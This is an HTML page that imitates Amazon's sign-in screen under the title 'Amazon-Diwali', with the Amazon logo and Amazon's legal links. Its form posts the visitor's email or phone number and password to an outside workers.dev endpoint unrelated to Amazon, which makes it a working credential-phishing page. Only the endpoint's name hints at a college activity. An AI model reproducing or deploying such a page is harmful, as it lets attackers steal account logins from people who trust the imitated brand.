<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Amazon-Diwali</title>
</head>
<body>
    <div class="main">
        <img src="logo.png" alt="Amazon Logo" class="logo">
        <div class="cont">
            <div class="box">
                <h1>Sign in</h1>
                <form action="https://amazon-college-extension-activity.bradithya614.workers.dev" method="POST">
                    <label for="email">Email or mobile phone number</label>
                    <input type="email" id="email" name="User" required>
                    
                    <label for="password">
                        Password 
                        <a href="#" class="split">Forgot Password?</a>
                    </label>
                    <input type="password" id="password" name="Pass" required>
                    
                    <input type="submit" value="Sign in" class="btn-submit">
                </form>
                
                <p>By continuing, you agree to Amazon's 
                    <a href="#" class="col_blue">Conditions of Use</a> and 
                    <a href="#" class="col_blue">Privacy Notice</a>.
                </p>
            </div>
        </div>
    </div>
</body>
</html>
